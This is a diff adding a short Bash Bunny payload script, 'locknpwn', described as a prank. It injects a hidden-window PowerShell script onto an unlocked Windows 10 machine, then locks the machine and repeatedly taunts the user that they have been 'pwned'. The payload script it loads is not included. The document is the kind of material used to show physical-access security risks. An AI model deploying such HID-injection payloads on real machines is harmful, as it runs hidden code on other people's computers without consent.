@@ -1,0 +1,35 @@
+#!/bin/bash
+############################################################################################
+#
+# Title:         locknpwn
+# Description:   Example prank payload for the Bashbunny Powershell Framework.  Bashbunny
+#                can be removed when the LED goes green.  Powershell scripts runs in a 
+#                hidden powershell window in unattended mode
+#
+#                Waits 5 minutes (300 seconds) and then triggers rest of the payload
+#                Volume on the computer speaker is turned up (and off if already off)
+#                Warns the unsuspecting user that they didn't lock their computer while 
+#                they were away from their desk and they should have done, because now
+#                they've been hacked.
+#                Computer is locked 
+#                Randomly every 10-30 seconds the computer reminds them that they have been pwned
+#
+#                This part of the payload simply injects a powershell script onto the victim and shuts down
+#                It shows how simple the framework makes running hidden windows powershell admin payloads 
+# Author:        p3rki3
+# Props:		 
+# Version:       0.91
+# Dependencies:  bashbunny powershell framework extension, gohttp (for NET method only)
+# Category:      Prank
+# Target:        Windows 10 (Powershell) - may work on earlier versions, but untested
+# Attackmodes:   HID, Ethernet
+# 
+############################################################################################
+
+LED SETUP
+INVOKE_POWERSHELL "NET" "QUIET" "OFF"
+LED STAGE1
+INJECT_PSSCRIPT "locknpwn.ps1"
+sleep 2
+ATTACKMODE OFF
+LED FINISH
